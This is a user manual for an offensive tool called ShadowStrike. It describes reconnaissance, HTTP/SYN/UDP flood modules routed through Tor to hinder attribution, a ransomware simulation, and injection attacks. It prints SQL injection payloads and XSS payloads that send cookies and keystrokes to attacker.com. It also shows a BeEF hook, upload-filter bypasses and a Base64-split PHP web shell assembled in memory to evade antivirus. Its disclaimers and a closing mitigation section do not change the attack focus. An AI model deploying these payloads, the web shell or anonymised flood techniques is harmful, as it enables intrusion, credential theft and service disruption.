# ShadowStrike User Manual

## Table of Contents
1. [Introduction](#introduction)
2. [Reconnaissance Module](#reconnaissance-module)
3. [DDoS Attack Modules](#ddos-attack-modules)
4. [Injection Attack Module](#injection-attack-module)
5. [Ransomware Simulation Module](#ransomware-simulation-module)
6. [Global Tor Shield](#global-tor-shield)
7. [Legal Disclaimer](#legal-disclaimer)

---

## Introduction

ShadowStrike is a penetration testing and security research tool designed for authorized security assessments. This manual provides detailed information about each attack module, how they operate, and their potential effects.

> **WARNING**: This tool is intended for educational purposes and authorized security testing only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## Reconnaissance Module

### Overview
The Reconnaissance module performs passive and active information gathering about target systems to identify potential vulnerabilities and attack surfaces.

### How It Works

#### 1. **Port Scanning**
- **Process**: Sends TCP/UDP packets to common ports (1-1024) to identify open services
- **Technique**: Uses asynchronous socket connections with timeout detection
- **Information Gathered**:
  - Open ports and running services
  - Service versions and banners
  - Operating system fingerprinting

#### 2. **WHOIS Lookup**
- **Process**: Queries domain registration databases
- **Information Gathered**:
  - Domain owner details
  - Registration and expiration dates
  - Name servers
  - Registrar information

#### 3. **DNS Analysis**
- **Process**: Performs DNS queries for various record types
- **Records Queried**:
  - A records (IPv4 addresses)
  - AAAA records (IPv6 addresses)
  - MX records (mail servers)
  - NS records (name servers)
  - TXT records (SPF, DKIM, DMARC)

#### 4. **Subdomain Enumeration**
- **Process**: Tests common subdomain prefixes against the target domain
- **Common Subdomains Tested**: www, mail, ftp, admin, dev, staging, api, etc.
- **Technique**: DNS resolution with parallel queries

#### 5. **Email Security Analysis**
- **Process**: Analyzes email security configurations
- **Checks Performed**:
  - SPF (Sender Policy Framework) records
  - DKIM (DomainKeys Identified Mail) configuration
  - DMARC (Domain-based Message Authentication) policies

### Effects & Consequences
- **Defensive Value**: Identifies exposed services and misconfigurations
- **Attacker Perspective**: Reveals attack surface and potential entry points
- **Network Impact**: Minimal - generates standard network traffic
- **Detection Risk**: Low to Medium - appears as normal reconnaissance traffic

---

## DDoS Attack Modules

### 1. HTTP Flood Attack

#### How It Works
- **Technique**: Application-layer (Layer 7) attack
- **Process**:
  1. Creates multiple concurrent HTTP connections (500+ threads)
  2. Sends legitimate-looking HTTP GET/POST requests
  3. Randomizes User-Agent headers to evade detection
  4. Maintains persistent connections when possible
  5. Implements connection pooling for efficiency

#### Attack Flow
```
[Attacker] → [Tor Proxy] → [Multiple Threads] → [Target Web Server]
     ↓
  500+ concurrent requests/second
     ↓
  Server resources exhausted
```

#### Effects & Consequences
- **Server Impact**:
  - CPU exhaustion from processing requests
  - Memory depletion from connection handling
  - Thread pool saturation
  - Database connection exhaustion
- **User Impact**:
  - Website becomes slow or unresponsive
  - Legitimate users cannot access services
  - Potential data loss if transactions fail
- **Infrastructure Impact**:
  - Load balancer overload
  - CDN cache bypass
  - Backend service degradation

#### Detection Indicators
- Sudden spike in HTTP requests from similar sources
- Unusual User-Agent patterns
- High connection count from Tor exit nodes
- Abnormal request patterns (same URL repeatedly)

---

### 2. SYN Flood Attack

#### How It Works
- **Technique**: Network-layer (Layer 4) attack exploiting TCP handshake
- **Process**:
  1. Sends TCP SYN packets with spoofed source IPs
  2. Target responds with SYN-ACK packets
  3. Attacker never sends final ACK
  4. Target keeps half-open connections in memory
  5. Connection table fills up, denying legitimate connections

#### TCP Handshake Exploitation
```
Normal:    [SYN] → [SYN-ACK] → [ACK] ✓
Attack:    [SYN] → [SYN-ACK] → [NOTHING] ✗
           (Spoofed IP)  ↑
                    Connection left hanging
```

#### Effects & Consequences
- **Server Impact**:
  - Connection table overflow
  - Memory exhaustion
  - Firewall state table saturation
  - Complete service unavailability
- **Network Impact**:
  - Bandwidth consumption
  - Router/switch resource depletion
  - Collateral damage to other services on same network
- **Recovery Time**: Minutes to hours depending on timeout settings

#### Detection Indicators
- High volume of SYN packets
- Large number of half-open connections
- Connections from non-existent or unreachable IPs
- Asymmetric traffic patterns

---

### 3. UDP Flood Attack

#### How It Works
- **Technique**: Network-layer (Layer 4) volumetric attack
- **Process**:
  1. Sends large volumes of UDP packets to random ports
  2. Target checks for listening applications
  3. Responds with ICMP "Destination Unreachable" messages
  4. Resources consumed processing and responding to packets
  5. Bandwidth saturated with attack traffic

#### Attack Flow
```
[Attacker] → UDP Packets (random ports) → [Target]
                                              ↓
                                    Check for application
                                              ↓
                                    ICMP Response
                                              ↓
                                    Resources exhausted
```

#### Effects & Consequences
- **Server Impact**:
  - CPU cycles wasted checking ports
  - Network stack overload
  - ICMP response generation overhead
- **Network Impact**:
  - Bandwidth saturation (primary goal)
  - Upstream router congestion
  - Collateral damage to nearby services
- **Infrastructure Impact**:
  - Firewall rule processing overhead
  - IDS/IPS system overload
  - Network equipment failure

#### Detection Indicators
- Abnormally high UDP traffic
- Traffic to random/closed ports
- High ICMP error rate
- Bandwidth utilization spikes

---

## Injection Attack Module

### 1. SQL Injection (SQLi)

#### How It Works
- **Technique**: Code injection exploiting database query construction
- **Process**:
  1. Identifies input parameters (URL params, forms, headers)
  2. Tests for SQL syntax errors
  3. Attempts boolean-based blind injection
  4. Executes UNION-based data extraction
  5. Performs time-based blind injection for confirmation

#### Attack Payloads
```sql
-- Error-based detection
' OR '1'='1

-- Boolean-based blind
' AND 1=1--
' AND 1=2--

-- UNION-based extraction
' UNION SELECT username, password FROM users--

-- Time-based blind
' AND SLEEP(5)--
```

#### Attack Modes

**SCAN VULNERABILITIES**
- Tests various SQL injection payloads
- Identifies vulnerable parameters
- Determines database type
- Assesses injection complexity

**DUMP DATABASE**
- Extracts table names
- Retrieves column information
- Dumps sensitive data (usernames, passwords, credit cards)
- Downloads entire database contents

**AUTH BYPASS**
- Bypasses login forms
- Gains unauthorized access
- Escalates privileges
- Creates backdoor accounts

#### Effects & Consequences
- **Data Breach**:
  - Complete database exposure
  - Customer data theft
  - Financial information leakage
  - Intellectual property theft
- **System Compromise**:
  - Administrative access gained
  - Malicious data modification
  - Data deletion/corruption
  - Backdoor installation
- **Business Impact**:
  - Regulatory fines (GDPR, CCPA)
  - Reputation damage
  - Legal liability
  - Customer trust loss

---

### 2. Cross-Site Scripting (XSS)

#### How It Works
- **Technique**: Client-side code injection
- **Process**:
  1. Identifies reflection points (search, comments, profiles)
  2. Tests for HTML/JavaScript injection
  3. Bypasses input sanitization
  4. Deploys malicious payloads
  5. Steals session cookies or credentials

#### Attack Types

**Reflected XSS**
```javascript
// URL parameter injection
http://target.com/search?q=<script>alert('XSS')</script>
```

**Stored XSS**
```javascript
// Comment field injection
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**DOM-based XSS**
```javascript
// Client-side manipulation
location.hash = "<img src=x onerror='malicious_code()'>"
```

#### Payload Capabilities

**Session Stealing**
```javascript
fetch('http://attacker.com/steal?cookie=' + document.cookie);
```

**Keylogging**
```javascript
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
});
```

**BeEF Hook Integration**
```javascript
<script src="http://attacker.com:3000/hook.js"></script>
```

#### Effects & Consequences
- **User Impact**:
  - Account hijacking
  - Credential theft
  - Malware distribution
  - Phishing attacks
- **Application Impact**:
  - Defacement
  - Malicious redirects
  - Data exfiltration
  - Privilege escalation
- **Business Impact**:
  - User trust erosion
  - Compliance violations
  - Brand damage
  - Legal liability

---

### 3. File Upload Vulnerabilities

#### How It Works
- **Technique**: Unrestricted file upload exploitation
- **Process**:
  1. Tests file upload functionality
  2. Attempts to bypass extension filters
  3. Uploads web shell (PHP, ASPX, JSP)
  4. Accesses uploaded shell via direct URL
  5. Executes system commands remotely

#### Bypass Techniques

**Double Extension**
```
shell.php.jpg  → Parsed as PHP on misconfigured servers
```

**Null Byte Injection**
```
shell.php%00.jpg  → Truncates at null byte
```

**MIME Type Manipulation**
```
Content-Type: image/jpeg
(but file contains PHP code)
```

#### Web Shell Capabilities
- **Command Execution**: Run arbitrary system commands
- **File Management**: Upload, download, delete files
- **Database Access**: Connect to databases
- **Network Pivoting**: Use server as attack proxy
- **Privilege Escalation**: Exploit local vulnerabilities

#### Dynamic Payload Generation
ShadowStrike generates web shells **in-memory** to avoid antivirus detection:
```csharp
// Base64-encoded components assembled at runtime
var p1 = Convert.FromBase64String("PD9waHA=");      // <?php
var p2 = Convert.FromBase64String("c3lzdGVt");      // system
var p3 = Convert.FromBase64String("KCRfR0VUWydjbWQnXSk7"); // ($_GET['cmd']);
var p4 = Convert.FromBase64String("Pz4=");          // ?>
```

#### Effects & Consequences
- **Server Compromise**:
  - Complete system control
  - Data exfiltration
  - Lateral movement
  - Persistence mechanisms
- **Network Impact**:
  - Internal network access
  - Pivot point for further attacks
  - Malware distribution
  - C2 (Command & Control) establishment
- **Business Impact**:
  - Complete infrastructure compromise
  - Ransomware deployment
  - Intellectual property theft
  - Regulatory violations

---

## Ransomware Simulation Module

### Overview
Educational simulation demonstrating ransomware behavior patterns **without actual encryption**.

### How It Works

#### Reconnaissance Phase
1. **File Discovery**:
   - Scans target directory recursively
   - Identifies file types (documents, images, databases)
   - Catalogs file locations and sizes
   - Estimates encryption time

2. **System Profiling**:
   - Gathers system information
   - Identifies backup locations
   - Checks for security software
   - Maps network drives

#### Simulation Phase
1. **File Enumeration**:
   - Lists all discoverable files
   - Categorizes by type and priority
   - Displays potential impact statistics

2. **Encryption Simulation**:
   - **DOES NOT ACTUALLY ENCRYPT FILES**
   - Shows what would be encrypted
   - Demonstrates ransom note generation
   - Displays payment demands

3. **Reporting**:
   - Number of files affected
   - Total data size
   - Estimated recovery time
   - Ransom amount calculation

### Real Ransomware Behavior (Educational)

#### Actual Attack Flow
```
1. Initial Access (phishing, exploit, RDP)
   ↓
2. Privilege Escalation
   ↓
3. Defense Evasion (disable AV, delete backups)
   ↓
4. Discovery (map network, find valuable data)
   ↓
5. Lateral Movement (spread to other systems)
   ↓
6. Data Exfiltration (steal before encrypting)
   ↓
7. Encryption (AES-256 + RSA-2048)
   ↓
8. Ransom Demand (Bitcoin payment)
```

#### Encryption Techniques
- **Symmetric Encryption**: AES-256 for file content
- **Asymmetric Encryption**: RSA-2048 for key protection
- **Key Management**: Unique key per victim
- **File Targeting**: Documents, databases, backups, images

### Effects & Consequences
- **Data Loss**:
  - Complete file inaccessibility
  - Backup corruption
  - Shadow copy deletion
  - Permanent data loss if no backups
- **Business Impact**:
  - Operational shutdown
  - Revenue loss ($thousands to $millions per day)
  - Ransom payment (average $200k-$2M)
  - Recovery costs (often exceed ransom)
- **Long-term Damage**:
  - Reputation destruction
  - Customer attrition
  - Regulatory fines
  - Potential bankruptcy

---

## Global Tor Shield

### Overview
ShadowStrike integrates a global Tor proxy to anonymize all attack traffic, making attribution extremely difficult.

### How It Works

#### Tor Network Architecture
```
[ShadowStrike] → [Tor Client] → [Entry Node] → [Middle Node] → [Exit Node] → [Target]
                                     ↓              ↓              ↓
                                 Encrypted    Encrypted    Cleartext
```

#### Features

**Automatic Integration**
- All HTTP/HTTPS requests automatically routed through Tor
- SOCKS5 proxy configuration
- No manual setup required

**IP Rotation**
- Automatic identity rotation every 10 minutes
- Manual rotation on-demand
- Different exit nodes for each attack

**Traffic Encryption**
- Multi-layer encryption (onion routing)
- Entry node sees your IP but not destination
- Exit node sees destination but not your IP
- Middle nodes see neither

### Anonymity Benefits
- **IP Masking**: Target sees Tor exit node IP
- **Location Obfuscation**: Appears from different countries
- **Traffic Analysis Resistance**: Encrypted multi-hop routing
- **Attribution Difficulty**: Extremely hard to trace back

### Limitations
- **Speed Reduction**: 50-70% slower than direct connection
- **Exit Node Trust**: Exit node can see cleartext traffic
- **Not Perfect**: Advanced correlation attacks possible
- **Legal Notice**: Tor use doesn't make illegal activity legal

---

## Legal Disclaimer

### Authorized Use Only
This tool is designed for:
- **Penetration Testing**: With written authorization
- **Security Research**: On systems you own
- **Educational Purposes**: In controlled lab environments
- **Vulnerability Assessment**: With explicit permission

### Illegal Activities
Using ShadowStrike for unauthorized access is **ILLEGAL** and may result in:
- **Criminal Charges**: Computer Fraud and Abuse Act (CFAA)
- **Civil Liability**: Damages, injunctions, lawsuits
- **Prison Time**: Up to 20 years for serious violations
- **Fines**: Up to $250,000 or more

### Responsible Disclosure
If you discover vulnerabilities:
1. Report to the organization privately
2. Allow reasonable time for patching (90 days)
3. Do not exploit for personal gain
4. Follow coordinated disclosure practices

### Ethical Guidelines
- **Obtain Permission**: Always get written authorization
- **Minimize Damage**: Use least invasive techniques
- **Protect Data**: Don't exfiltrate or expose sensitive information
- **Report Findings**: Provide detailed, actionable reports
- **Respect Privacy**: Follow data protection regulations

---

## Mitigation & Defense

### Protecting Against These Attacks

#### DDoS Protection
- **Rate Limiting**: Limit requests per IP
- **CDN Usage**: Cloudflare, Akamai, AWS Shield
- **Traffic Analysis**: Detect abnormal patterns
- **SYN Cookies**: Mitigate SYN floods
- **Firewall Rules**: Block malicious IPs

#### Injection Prevention
- **Parameterized Queries**: Use prepared statements
- **Input Validation**: Whitelist acceptable input
- **Output Encoding**: Escape special characters
- **WAF Deployment**: Web Application Firewall
- **Least Privilege**: Minimal database permissions

#### File Upload Security
- **Extension Whitelist**: Only allow specific types
- **Content Validation**: Check file contents, not just extension
- **Separate Storage**: Store uploads outside webroot
- **Execution Prevention**: Disable script execution in upload directories
- **Antivirus Scanning**: Scan all uploaded files

#### Ransomware Defense
- **Regular Backups**: 3-2-1 backup strategy
- **Offline Backups**: Air-gapped storage
- **Email Filtering**: Block malicious attachments
- **Endpoint Protection**: EDR solutions
- **User Training**: Phishing awareness
- **Patch Management**: Keep systems updated

---

## Conclusion

ShadowStrike is a powerful tool that demonstrates real-world attack techniques. Understanding how these attacks work is crucial for building effective defenses. Always use this tool responsibly and ethically.

**Remember**: With great power comes great responsibility. Use your knowledge to protect, not to harm.

---

*Last Updated: December 2025*
*Version: 2.1.0*
